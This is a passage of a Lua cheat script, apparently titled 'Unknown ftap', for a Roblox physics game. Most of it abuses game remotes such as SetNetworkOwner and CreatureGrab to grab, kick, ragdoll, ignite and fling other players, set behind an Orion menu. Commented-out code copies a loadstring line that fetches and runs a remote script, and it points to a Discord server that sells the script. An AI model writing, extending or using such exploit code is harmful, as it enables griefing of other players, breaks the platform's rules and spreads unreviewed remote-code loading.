            warn("Error in fireAll: " .. tostring(err))
        end
        wait()
    end
end

local function createHighlight(parent)
    local highlight = Instance.new("Highlight")
    highlight.DepthMode = Enum.HighlightDepthMode.Occluded
    highlight.FillTransparency = 1
    highlight.Name = "Highlight"
    highlight.OutlineColor = Color3.new(0, 0, 1)
    highlight.OutlineTransparency = 0.5
    highlight.Parent = parent
    print("created highlight and set on "..parent.Name)
    return highlight
end

local function onPartOwnerAdded(descendant, primaryPart)
    if descendant.Name == "PartOwner" and descendant.Value ~= localPlayer.Name then
        local highlight = primaryPart:FindFirstChild("Highlight") or U.GetDescendant(U.FindFirstAncestorOfType(primaryPart, "Model"), "Highlight", "Highlight")
        if highlight then
            if descendant.Value ~= localPlayer.Name then
                highlight.OutlineColor = Color3.new(1, 0, 0)
            else
                highlight.OutlineColor = Color3.new(0, 0, 1)
            end
        end
    end
end

local function createBodyMovers(part, position, rotation)
    local bodyPosition = Instance.new("BodyPosition")
    local bodyGyro = Instance.new("BodyGyro")

    bodyPosition.P = 15000
    bodyPosition.D = 200
    bodyPosition.MaxForce = Vector3.new(5000000, 5000000, 5000000)
    bodyPosition.Position = position
    bodyPosition.Parent = part

    bodyGyro.P = 15000
    bodyGyro.D = 200
    bodyGyro.MaxTorque = Vector3.new(5000000, 5000000, 5000000)
    bodyGyro.CFrame = rotation
    bodyGyro.Parent = part
end

local function anchorGrab()
    while true do
        pcall(function()
            local grabParts = workspace:FindFirstChild("GrabParts")
            if not grabParts then return end

            local grabPart = grabParts:FindFirstChild("GrabPart")
            if not grabPart then return end

            local weldConstraint = grabPart:FindFirstChild("WeldConstraint")
            if not weldConstraint or not weldConstraint.Part1 then return end

            local primaryPart = weldConstraint.Part1.Name == "SoundPart" and weldConstraint.Part1 or weldConstraint.Part1.Parent.SoundPart or weldConstraint.Part1.Parent.PrimaryPart or weldConstraint.Part1
            if not primaryPart then return end
            if primaryPart.Anchored then return end

            if isDescendantOf(primaryPart, workspace.Map) then return end
            for _, player in pairs(Players:GetChildren()) do
                if isDescendantOf(primaryPart, player.Character) then return end
            end
            local t = true
            for _, v in pairs(primaryPart:GetDescendants()) do
                if table.find(anchoredParts, v) then
                    t = false
                end

            end
            if t and not table.find(anchoredParts, primaryPart) then
                local target 
                if U.FindFirstAncestorOfType(primaryPart, "Model") and U.FindFirstAncestorOfType(primaryPart, "Model") ~= workspace then
                    target = U.FindFirstAncestorOfType(primaryPart, "Model")
                else
                    target = primaryPart
                end

                local highlight = createHighlight(target)
                table.insert(anchoredParts, primaryPart)
                
                print(target)
                local connection = target.DescendantAdded:Connect(function(descendant)
                    onPartOwnerAdded(descendant, primaryPart)
                end)
                table.insert(anchoredConnections, connection)
            end

            
            if U.FindFirstAncestorOfType(primaryPart, "Model") and U.FindFirstAncestorOfType(primaryPart, "Model") ~= workspace then 
                for _, child in ipairs(U.FindFirstAncestorOfType(primaryPart, "Model"):GetDescendants()) do
                    if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
                        child:Destroy()
                    end
                end
            else
                for _, child in ipairs(primaryPart:GetChildren()) do
                    if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
                        child:Destroy()
                    end
                end
            end

            while workspace:FindFirstChild("GrabParts") do
                wait()
            end
            createBodyMovers(primaryPart, primaryPart.Position, primaryPart.CFrame)
        end)
        wait()
    end
end
local function anchorKickGrab()
    while true do
        pcall(function()
            local grabParts = workspace:FindFirstChild("GrabParts")
            if not grabParts then return end

            local grabPart = grabParts:FindFirstChild("GrabPart")
            if not grabPart then return end

            local weldConstraint = grabPart:FindFirstChild("WeldConstraint")
            if not weldConstraint or not weldConstraint.Part1 then return end

            local primaryPart = weldConstraint.Part1
            if not primaryPart then return end

            if isDescendantOf(primaryPart, workspace.Map) then return end
            if primaryPart.Name ~= "FirePlayerPart" then return end

            for _, child in ipairs(primaryPart:GetChildren()) do
                if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
                    child:Destroy()
                end
            end

            while workspace:FindFirstChild("GrabParts") do
                wait()
            end
            createBodyMovers(primaryPart, primaryPart.Position, primaryPart.CFrame)
        end)
        wait()
    end
end

local function cleanupAnchoredParts()
    for _, part in ipairs(anchoredParts) do
        if part then
            if part:FindFirstChild("BodyPosition") then
                part.BodyPosition:Destroy()
            end
            if part:FindFirstChild("BodyGyro") then
                part.BodyGyro:Destroy()
            end
            local highlight = part:FindFirstChild("Highlight") or part.Parent and part.Parent:FindFirstChild("Highlight")
            if highlight then
                highlight:Destroy()
            end
        end
    end

    cleanupConnections(anchoredConnections)
    anchoredParts = {}
end

local function updateBodyMovers(primaryPart)
    for _, group in ipairs(compiledGroups) do
        if group.primaryPart and group.primaryPart == primaryPart then
            for _, data in ipairs(group.group) do
                local bodyPosition = data.part:FindFirstChild("BodyPosition")
                local bodyGyro = data.part:FindFirstChild("BodyGyro")
                if bodyPosition then
                    bodyPosition.Position = (primaryPart.CFrame * data.offset).Position
                end
                if bodyGyro then
                    bodyGyro.CFrame = primaryPart.CFrame * data.offset
                end
            end
        end
    end
end

local function compileGroup()
    if #anchoredParts == 0 then 
        OrionLib:MakeNotification({Name = "Error", Content = "No anchored parts found", Image = "rbxassetid://4483345998", Time = 5})
    else
        OrionLib:MakeNotification({Name = "Success", Content = "Compiled "..#anchoredParts.." Toys together", Image = "rbxassetid://4483345998", Time = 5})
    end

    local primaryPart = anchoredParts[1]
    if not primaryPart then return end

    local highlight =  primaryPart:FindFirstChild("Highlight") or primaryPart.Parent:FindFirstChild("Highlight")
    if not highlight then
        highlight = createHighlight(primaryPart.Parent:IsA("Model") and primaryPart.Parent or primaryPart)
    end
    highlight.OutlineColor = Color3.new(0, 1, 0) 
    

    local group = {}
    for _, part in ipairs(anchoredParts) do
        if part ~= primaryPart then
            local offset = primaryPart.CFrame:toObjectSpace(part.CFrame)
            table.insert(group, {part = part, offset = offset})
        end
    end
    table.insert(compiledGroups, {primaryPart = primaryPart, group = group})
    
    local connection = primaryPart:GetPropertyChangedSignal("CFrame"):Connect(function()
        updateBodyMovers(primaryPart)
    end)
    table.insert(compileConnections, connection)

    local renderSteppedConnection = RunService.Heartbeat:Connect(function()
        updateBodyMovers(primaryPart)
    end)
    table.insert(renderSteppedConnections, renderSteppedConnection)
end

local function cleanupCompiledGroups()
    for _, groupData in ipairs(compiledGroups) do
        for _, data in ipairs(groupData.group) do
            if data.part then
                if data.part:FindFirstChild("BodyPosition") then
                    data.part.BodyPosition:Destroy()
                end
                if data.part:FindFirstChild("BodyGyro") then
                    data.part.BodyGyro:Destroy()
                end
            end
        end
        if groupData.primaryPart and groupData.primaryPart.Parent then
            local highlight = groupData.primaryPart:FindFirstChild("Highlight") or groupData.primaryPart.Parent:FindFirstChild("Highlight")
            if highlight then
                highlight:Destroy()
            end
        end
    end
    
    cleanupConnections(compileConnections)
    cleanupConnections(renderSteppedConnections)
    compiledGroups = {}
end

local function compileCoroutineFunc()
    while true do
        pcall(function()
            for _, groupData in ipairs(compiledGroups) do
                updateBodyMovers(groupData.primaryPart)
            end
        end)
        wait()
    end
end

local function unanchorPrimaryPart()
    local primaryPart = anchoredParts[1]
    if not primaryPart then return end
    if primaryPart:FindFirstChild("BodyPosition") then
        primaryPart.BodyPosition:Destroy()
    end
    if primaryPart:FindFirstChild("BodyGyro") then
        primaryPart.BodyGyro:Destroy()
    end
    local highlight = primaryPart.Parent:FindFirstChild("Highlight") or primaryPart:FindFirstChild("Highlight")
    if highlight then
        highlight:Destroy()
    end
end
local function recoverParts()
    while true do
        local success, err = pcall(function()
            local character = localPlayer.Character
            if character and character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") then
                local head = character.Head
                local humanoidRootPart = character.HumanoidRootPart

                for _, partModel in pairs(anchoredParts) do
                    coroutine.wrap(function()
                        if partModel then
                            local distance = (partModel.Position - humanoidRootPart.Position).Magnitude
                            if distance <= 30 then
                                local highlight = partModel:FindFirstChild("Highlight") or partModel.Parent:FindFirstChild("Highlight")
                                if highlight and highlight.OutlineColor == Color3.new(1, 0, 0) then
                                    SetNetworkOwner:FireServer(partModel, partModel.CFrame)
                                    if partModel:WaitForChild("PartOwner") and partModel.PartOwner.Value == localPlayer.Name then
                                        highlight.OutlineColor = Color3.new(0, 0, 1)
                                        print("yoyoyo set and r eady")
                                    end
                                end
                            end
                        end
                    end)()
                end
            end
        end)
        wait(0.02)
    end
end
local function ragdollAll()
    while true do
        local success, err = pcall(function()
            if not toysFolder:FindFirstChild("FoodBanana") then
                spawnItem("FoodBanana", Vector3.new(-72.9304581, -5.96906614, -265.543732))
            end
            local banana = toysFolder:WaitForChild("FoodBanana")
            local bananaPeel
            for _, part in pairs(banana:GetChildren()) do
                if part.Name == "BananaPeel" and part:FindFirstChild("TouchInterest") then
                    part.Size = Vector3.new(10, 10, 10)
                    part.Transparency = 1
                    bananaPeel = part
                    break
                end
            end
            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.P = 20000
            bodyPosition.Parent = banana.Main
            while true do
                for _, player in pairs(Players:GetChildren()) do
                    pcall(function()
                        if player.Character and player.Character ~= playerCharacter then
                            bananaPeel.Position = player.Character.HumanoidRootPart.Position or player.Character.Head.Position
                            bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
                            wait()
                        end
                    end)
                end   
                wait()
            end
        end)
        if not success then
            warn("Error in ragdollAll: " .. tostring(err))
        end
        wait()
    end
end
local function reloadMissile(bool)
    if bool then
        if not ownedToys[_G.ToyToLoad] then
            OrionLib:MakeNotification({
                Name = "Missing toy",
                Content = "You do not own the ".._G.ToyToLoad.." toy.",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
            return
        end

        if not reloadBombCoroutine then
            reloadBombCoroutine = coroutine.create(function()
                connectionBombReload = toysFolder.ChildAdded:Connect(function(child)
                    if child.Name == _G.ToyToLoad and child:WaitForChild("ThisToysNumber", 1) then
                        if child.ThisToysNumber.Value == (toysFolder.ToyNumber.Value - 1) then
                            local connection2
                            connection2 = toysFolder.ChildRemoved:Connect(function(child2)
                                if child2 == child then
                                    connection2:Disconnect()
                                end
                            end)

                            SetNetworkOwner:FireServer(child.Body, child.Body.CFrame)
                            local waiting = child.Body:WaitForChild("PartOwner", 0.5)
                            local connection = child.DescendantAdded:Connect(function(descendant)
                                if descendant.Name == "PartOwner" then
                                    if descendant.Value ~= localPlayer.Name then
                                        DestroyT(child)
                                        connection:Disconnect()
                                    end
                                end
                            end)
                            Debris:AddItem(connectio, 60)
                            if waiting and waiting.Value == localPlayer.Name then
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.CanCollide = false
                                    end
                                end
                                child:SetPrimaryPartCFrame(CFrame.new(-72.9304581, -3.96906614, -265.543732))
                                wait(0.2)
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.Anchored = true
                                    end
                                end
                                table.insert(bombList, child)
                                child.AncestryChanged:Connect(function()
                                    if not child.Parent then
                                        for i, bomb in ipairs(bombList) do
                                            if bomb == child then
                                                table.remove(bombList, i)
                                                break
                                            end
                                        end
                                    end
                                end)
                                connection2:Disconnect()
                            else
                                DestroyT(child)
                            end
                        end
                    end
                end)

                while true do
                    if localPlayer.CanSpawnToy and localPlayer.CanSpawnToy.Value and #bombList < _G.MaxMissiles and playerCharacter:FindFirstChild("Head") then
                        spawnItemCf(_G.ToyToLoad, playerCharacter.Head.CFrame or playerCharacter.HumanoidRootPart.CFrame)
                    end
                    RunService.Heartbeat:Wait()
                end
            end)
            coroutine.resume(reloadBombCoroutine)
        end
    else
        if reloadBombCoroutine then
            coroutine.close(reloadBombCoroutine)
            reloadBombCoroutine = nil
        end
        if connectionBombReload then
            connectionBombReload:Disconnect()
        end
    end
end
local function setupAntiExplosion(character)
    local partOwner = character:WaitForChild("Humanoid"):FindFirstChild("Ragdolled")
    if partOwner then
        local partOwnerChangedConn
        partOwnerChangedConn = partOwner:GetPropertyChangedSignal("Value"):Connect(function()
            if partOwner.Value then
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Anchored = true
                    end
                end
            else
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Anchored = false
                    end
                end
            end
        end)
        antiExplosionConnection = partOwnerChangedConn
    end
end


local blobalter = 1
local function blobGrabPlayer(player, blobman)
    if blobalter == 1 then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local args = {
                [1] = blobman:FindFirstChild("LeftDetector"),
                [2] = player.Character:FindFirstChild("HumanoidRootPart"),
                [3] = blobman:FindFirstChild("LeftDetector"):FindFirstChild("LeftWeld")
            }
            blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
            blobalter = 2
        end
    else
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local args = {
                [1] = blobman:FindFirstChild("RightDetector"),
                [2] = player.Character:FindFirstChild("HumanoidRootPart"),
                [3] = blobman:FindFirstChild("RightDetector"):FindFirstChild("RightWeld")
            }
            blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
            blobalter = 1
        end
    end
end




local version = "Сладострастие" --getVersion()

-- local whitelistIdsStr = game:HttpGet("https://raw.githubusercontent.com/Undebolted/FTAP/main/WhitelistedUserId.txt")
-- local whitelistIdsTbl = HttpService:JSONDecode(whitelistIdsStr)
-- local whitelistIds = {}

-- for id, _ in pairs(whitelistIdsTbl) do
--     if tonumber(id) then
--         table.insert(whitelistIds, tonumber(id))
--         print(id)
--     end
-- end

-- local isWhitelisted = false
-- for _, v in pairs(whitelistIds) do
--     if v == localPlayer.UserId then
--         isWhitelisted = true
--         break
--     end
-- end

-- local localVersion = "8.2-stable"
-- if localVersion ~= version then
--     OrionLib:MakeNotification({Name = "Script version mismatch!", Content = "You seem to have an older version of Unknown ftap. Original Loadstring has been copied", Image = "rbxassetid://4483345998", Time = 8})
--     setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/Undebolted/FTAP/main/Script.lua",true))()')
--     wait(12)
--     OrionLib:Destroy()
--     wait(9e9)
-- end

-- if isWhitelisted then
--     OrionLib:MakeNotification({Name = "You're whitelisted!", Content = "Enjoy your stay! (https://discord.gg/nzyEk6NnH2)", Image = "rbxassetid://4483345998", Time = 5})
-- else
--     OrionLib:MakeNotification({Name = "You're not whitelisted!", Content = "Please purchase the script in our discord server! Invite has been copied (https://discord.gg/nzyEk6NnH2)", Image = "rbxassetid://4483345998", Time = 8})
--     setclipboard('https://discord.gg/nzyEk6NnH2')
--     wait(12)
--     OrionLib:Destroy()
--     wait(9e9)
-- end
local Window = OrionLib:MakeWindow({
    Name = "Unknown ftap - Latest: " .. version, 
    HidePremium = false, 
    SaveConfig = false, 
    ConfigFolder = "Unknown ftap", 
    IntroEnabled = true, 
    IntroText = "Unknown ftap" ..version, 
    IntroIcon = "https://i.ibb.co/hM1SrzQ/glitched-dark-image.png", 
    Icon = "https://i.ibb.co/hM1SrzQ/glitched-dark-image.png"
})

local GrabTab = Window:MakeTab({Name = "Grab", Icon =  "rbxassetid://18624615643", PremiumOnly = false})

local ObjectGrabTab = Window:MakeTab({Name = "Object Grab", Icon =  "rbxassetid://18624606749", PremiumOnly = false})
local DefenseTab = Window:MakeTab({Name = "Defense", Icon =  "rbxassetid://18624604880", PremiumOnly = false})
local BlobmanTab = Window:MakeTab({Name = "Blob-man Grab", Icon =  "rbxassetid://18624614127", PremiumOnly = false})
local FunTab = Window:MakeTab({Name = "Fun", Icon =  "rbxassetid://18624603093", PremiumOnly = false})
local ScriptTab = Window:MakeTab({Name = "Scripts", Icon =  "rbxassetid://11570626783", PremiumOnly = false})
local AuraTab = Window:MakeTab({Name = "Auras", Icon =  "rbxassetid://18624608005", PremiumOnly = false})
local CharacterTab = Window:MakeTab({Name = "Character", Icon =  "rbxassetid://18624601543", PremiumOnly = false})
local ExplosionTab = Window:MakeTab({Name = "Explosions", Icon =  "rbxassetid://18624610285", PremiumOnly = false})
local KeybindsTab = Window:MakeTab({Name = "Keybinds", Icon =  "rbxassetid://18624616682", PremiumOnly = false})
local DevTab = Window:MakeTab({Name = "Dev Testing", Icon =  "rbxassetid://18624599762", PremiumOnly = false})



_G.strength = 500


GrabTab:AddSlider({
    Name = "Strength",
    Min = 500,
    Max = 10000,
    Color = Color3.fromRGB(240, 0, 0),
    ValueName = ".",
    Increment = 1,
    Default = _G.strength,
    Save = false,
    Flag = "StrengthSlider",
    Callback = function(value)
        _G.strength = value
    end
})

GrabTab:AddToggle({
    Name = "Strength",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "StrengthToggle",
    Callback = function(enabled)
        if enabled then
            strengthConnection = workspace.ChildAdded:Connect(function(model)
                if model.Name == "GrabParts" then
                    local partToImpulse = model.GrabPart.WeldConstraint.Part1
                    if partToImpulse then
                        local velocityObj = Instance.new("BodyVelocity", partToImpulse)
                        model:GetPropertyChangedSignal("Parent"):Connect(function()
                            if not model.Parent then
                                if UserInputService:GetLastInputType() == Enum.UserInputType.MouseButton2 then
                                    velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    velocityObj.Velocity = workspace.CurrentCamera.CFrame.LookVector * _G.strength
                                    Debris:AddItem(velocityObj, 1)
                                else
                                    velocityObj:Destroy()
                                end
                            end
                        end)
                    end
                end
            end)
        elseif strengthConnection then
            strengthConnection:Disconnect()
        end
    end
})

GrabTab:AddParagraph("Grab stuff", "These effects apply when you grab someone")

GrabTab:AddToggle({
    Name = "Poison Grab",
    Default = false,
    Save = false,
    Color = Color3.fromRGB(240, 0, 0),
    Flag = "PoisonGrab",
    Callback = function(enabled)
        if enabled then
            poisonGrabCoroutine = coroutine.create(function() grabHandler("poison") end)
            coroutine.resume(poisonGrabCoroutine)
        else
            if poisonGrabCoroutine then
                coroutine.close(poisonGrabCoroutine)
                poisonGrabCoroutine = nil
                for _, part in pairs(poisonHurtParts) do
                    part.Position = Vector3.new(0, -200, 0)
                end
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "Radioactive Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "RadioactiveGrab",
    Callback = function(enabled)
        if enabled then
            ufoGrabCoroutine = coroutine.create(function() grabHandler("radioactive") end)
            coroutine.resume(ufoGrabCoroutine)
        else
            if ufoGrabCoroutine then
                coroutine.close(ufoGrabCoroutine)
                ufoGrabCoroutine = nil
                for _, part in pairs(paintPlayerParts) do
                    part.Position = Vector3.new(0, -200, 0)
                end
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "Fire Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "FireGrab",
    Callback = function(enabled)
        if enabled then
            fireGrabCoroutine = coroutine.create(fireGrab)
            coroutine.resume(fireGrabCoroutine)
        else
            if fireGrabCoroutine then
                coroutine.close(fireGrabCoroutine)
                fireGrabCoroutine = nil
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "No-clip Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "NoclipGrab",
    Callback = function(enabled)
        if enabled then
            noclipGrabCoroutine = coroutine.create(noclipGrab)
            coroutine.resume(noclipGrabCoroutine)
        else
            if noclipGrabCoroutine then
                coroutine.close(noclipGrabCoroutine)
                noclipGrabCoroutine = nil
            end
        end
    end
})

GrabTab:AddToggle({
    Name = "Kick Grab",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = false,
    Flag = "KickGrab",
    Callback = function(enabled)
        if enabled then
            kickGrab()
        else
            for _, connection in pairs(kickGrabConnections) do
                connection:Disconnect()
            end
            for _, player in pairs(Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = player.Character.HumanoidRootPart
                    if hrp:FindFirstChild("FirePlayerPart") then
                        local fpp = hrp.FirePlayerPart
                        fpp.Size = Vector3.new(2.5, 5.5, 2.5)
                        fpp.CollisionGroup = "Default"
                        fpp.CanQuery = false
                    end
                end
            end
            kickGrabConnections = {}
        end
    end
})


GrabTab:AddToggle({
    Name = "Kick Grab Anchor (works with Kick Grab)",
    Default = false,
    Save = false,
    Color = Color3.fromRGB(240, 0, 0),
    Flag = "AnchorKickGrab",
    Callback = function(enabled)
        if enabled then
            if not anchorKickCoroutine or coroutine.status(anchorKickCoroutine) == "dead" then
                anchorKickCoroutine = coroutine.create(anchorKickGrab)
                coroutine.resume(anchorKickCoroutine)
            end
        else
            if anchorKickCoroutine and coroutine.status(anchorKickCoroutine) ~= "dead" then
                coroutine.close(anchorKickCoroutine)
                anchorKickCoroutine = nil
            end
        end
    end
})

GrabTab:AddParagraph("All-Features", "Make sure there are no campfires spawned by you BEFORE using this")

GrabTab:AddToggle({
    Name = "Fire All",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Callback = function(enabled)
        if enabled then
            fireAllCoroutine = coroutine.create(fireAll)
            coroutine.resume(fireAllCoroutine)
        else
            if fireAllCoroutine then
                coroutine.close(fireAllCoroutine)
                fireAllCoroutine = nil
            end
        end
    end
})


ObjectGrabTab:AddParagraph("Object-Only", "These effects only apply on objects.")

ObjectGrabTab:AddToggle({
    Name = "Anchor Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "AnchorGrab",
    Callback = function(enabled)
        if enabled then
            if not anchorGrabCoroutine or coroutine.status(anchorGrabCoroutine) == "dead" then
                anchorGrabCoroutine = coroutine.create(anchorGrab)
                coroutine.resume(anchorGrabCoroutine)
            end
        else
            if anchorGrabCoroutine and coroutine.status(anchorGrabCoroutine) ~= "dead" then
                coroutine.close(anchorGrabCoroutine)
                anchorGrabCoroutine = nil
            end
        end
    end
})

ObjectGrabTab:AddParagraph("Anchor grab information", "If someone grabs your anchored parts, they will fall and you will need to position them again!")

ObjectGrabTab:AddButton({
    Name = "Unanchor parts",
    Callback = cleanupAnchoredParts
})

ObjectGrabTab:AddParagraph("Compile?", "(New) This option allows you to compile all the anchored parts into one. To control this 'Build', you need to move the header part. The first part you grabbed will be the header and will be highlighted green")

ObjectGrabTab:AddButton({
    Name = "Compile Parts",
    Callback = function()
        compileGroup()
        if not compileCoroutine or coroutine.status(compileCoroutine) == "dead" then
            compileCoroutine = coroutine.create(compileCoroutineFunc)
            coroutine.resume(compileCoroutine)
        end
    end
})

ObjectGrabTab:AddParagraph("Disassemble", "De-compiles the build")

ObjectGrabTab:AddButton({
    Name = "Disassemble Parts",
    Callback = function()
        cleanupCompiledGroups()
        cleanupAnchoredParts()

        if compileCoroutine and coroutine.status(compileCoroutine) ~= "dead" then
            coroutine.close(compileCoroutine)
            compileCoroutine = nil
        end
    end
})
ObjectGrabTab:AddToggle({
    Name = "Auto Recover Dropped Parts",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = false,
    Flag = "AutoRecoverDroppedParts",
    Callback = function(enabled)
        if enabled then
            if not AutoRecoverDroppedPartsCoroutine or coroutine.status(AutoRecoverDroppedPartsCoroutine) == "dead" then
                AutoRecoverDroppedPartsCoroutine = coroutine.create(recoverParts)
                coroutine.resume(AutoRecoverDroppedPartsCoroutine)
            end
        else
            if AutoRecoverDroppedPartsCoroutine and coroutine.status(AutoRecoverDroppedPartsCoroutine) ~= "dead" then
                coroutine.close(AutoRecoverDroppedPartsCoroutine)
                AutoRecoverDroppedPartsCoroutine = nil
            end
        end
    end
})
ObjectGrabTab:AddButton({
    Name = "Unanchor Header Part",
    Callback = unanchorPrimaryPart
})


DefenseTab:AddLabel("Grab Defense")

DefenseTab:AddToggle({
    Name = "Anti-Grab",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = false,
    Flag = "AutoStruggle",
    Callback = function(enabled)
        if enabled then
            autoStruggleCoroutine = RunService.Heartbeat:Connect(function()
                local character = localPlayer.Character
                if character and character:FindFirstChild("Head") then
                    local head = character.Head
                    local partOwner = head:FindFirstChild("PartOwner")
                    if partOwner then
                        Struggle:FireServer()
                        ReplicatedStorage.GameCorrectionEvents.StopAllVelocity:FireServer()
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = true
                            end
                        end
                        while localPlayer.IsHeld.Value do
                            wait()
                        end
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = false
                            end
                        end
                    end
                end
            end)
        else
            if autoStruggleCoroutine then
                autoStruggleCoroutine:Disconnect()
                autoStruggleCoroutine = nil
            end
        end
    end
})

DefenseTab:AddToggle({
    Name = "Anti-Kick-Grab",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "AntiKickGrab",
    Callback = function(enabled)
        if enabled then
            local character = localPlayer.Character

            antiKickCoroutine = RunService.Heartbeat:Connect(function()
                local character = localPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FirePlayerPart") then
                    local partOwner = character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FirePlayerPart"):FindFirstChild("PartOwner")
                    if partOwner and partOwner.Value ~= localPlayer.Name then
                        local args = {[1] = character:WaitForChild("HumanoidRootPart"), [2] = 0}
                        game:GetService("ReplicatedStorage"):WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
                        print("grabbity shap!")
                        wait(0.1)
                        Struggle:FireServer()
                    end
                end
            end)
        else
            if antiKickCoroutine then
                antiKickCoroutine:Disconnect()
                antiKickCoroutine = nil
            end
        end
    end
})


DefenseTab:AddToggle({
    Name = "Anti-Explosion",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "AntiExplosion",
    Callback = function(enabled)
        local localPlayer = game.Players.LocalPlayer

        if enabled then
            if localPlayer.Character then
                setupAntiExplosion(localPlayer.Character)
            end
            characterAddedConn = localPlayer.CharacterAdded:Connect(function(character)
                if antiExplosionConnection then
                    antiExplosionConnection:Disconnect()
                end
                setupAntiExplosion(character)
            end)
        else
            if antiExplosionConnection then
                antiExplosionConnection:Disconnect()
                antiExplosionConnection = nil
            end
            if characterAddedConn then
                characterAddedConn:Disconnect()
                characterAddedConn = nil
            end
        end
    end
})



DefenseTab:AddLabel("Self-Defense")

DefenseTab:AddToggle({
    Name = "Self-Defense - Air Suspend",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = false,
    Flag = "SelfDefenseAirSuspend",
    Callback = function(enabled)
        if enabled then
            autoDefendCoroutine = coroutine.create(function()
                while wait(0.02) do
                    local character = localPlayer.Character
                    if character and character:FindFirstChild("Head") then
                        local head = character.Head
                        local partOwner = head:FindFirstChild("PartOwner")
                        if partOwner then
                            local attacker = Players:FindFirstChild(partOwner.Value)
                            if attacker and attacker.Character then
                                Struggle:FireServer()
                                SetNetworkOwner:FireServer(attacker.Character.Head or attacker.Character.Torso, attacker.Character.HumanoidRootPart.FirePlayerPart.CFrame)
                                task.wait(0.1)
                                local target = attacker.Character:FindFirstChild("Torso")
                                if target then
                                    local velocity = target:FindFirstChild("l") or Instance.new("BodyVelocity")
                                    velocity.Name = "l"
                                    velocity.Parent = target
                                    velocity.Velocity = Vector3.new(0, 50, 0)
                                    velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                    Debris:AddItem(velocity, 100)
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(autoDefendCoroutine)
        else
            if autoDefendCoroutine then
                coroutine.close(autoDefendCoroutine)
                autoDefendCoroutine = nil
            end
        end
    end
})

DefenseTab:AddToggle({
    Name = "Self-Defense Kick - Silent",
    Default = false,
    Save = false,
    Color = Color3.fromRGB(240, 0, 0),
    Flag = "SelfDefenseKick",
    Callback = function(enabled)
        if enabled then
            autoDefendKickCoroutine = coroutine.create(function()
                while enabled do
                    local character = localPlayer.Character
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        local humanoidRootPart = character.HumanoidRootPart
                        local head = character:FindFirstChild("Head")
                        if head then
                            local partOwner = head:FindFirstChild("PartOwner")
                            if partOwner then
                                local attacker = Players:FindFirstChild(partOwner.Value)
                                if attacker and attacker.Character then
                                    Struggle:FireServer()
                                    SetNetworkOwner:FireServer(attacker.Character.HumanoidRootPart.FirePlayerPart, attacker.Character.HumanoidRootPart.FirePlayerPart.CFrame)
                                    task.wait(0.1)
                                    if not attacker.Character.HumanoidRootPart.FirePlayerPart:FindFirstChild("BodyVelocity") then
                                        local bodyVelocity = Instance.new("BodyVelocity")
                                        bodyVelocity.Name = "BodyVelocity"
                                        bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        bodyVelocity.Velocity = Vector3.new(0, 20, 0)
                                        bodyVelocity.Parent = attacker.Character.HumanoidRootPart.FirePlayerPart
                                    end
                                end
                            end
                        end
                    end
                    wait(0.02)
                end
            end)
            coroutine.resume(autoDefendKickCoroutine)
        else
            if autoDefendKickCoroutine then
                coroutine.close(autoDefendKickCoroutine)
                autoDefendKickCoroutine = nil
            end
        end
    end
})
local blobman1
blobman1 = BlobmanTab:AddToggle({
    Name = "Loop Grab All",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Callback = function(enabled)
        if enabled then
            print("Toggle enabled")
            blobmanCoroutine = coroutine.create(function()
                local foundBlobman = false
                for i, v in pairs(game.Workspace:GetDescendants()) do
                    if v.Name == "CreatureBlobman" then
                        print("Found CreatureBlobman")
                        if v:FindFirstChild("VehicleSeat") and v.VehicleSeat:FindFirstChild("SeatWeld") and isDescendantOf(v.VehicleSeat.SeatWeld.Part1, localPlayer.Character) then
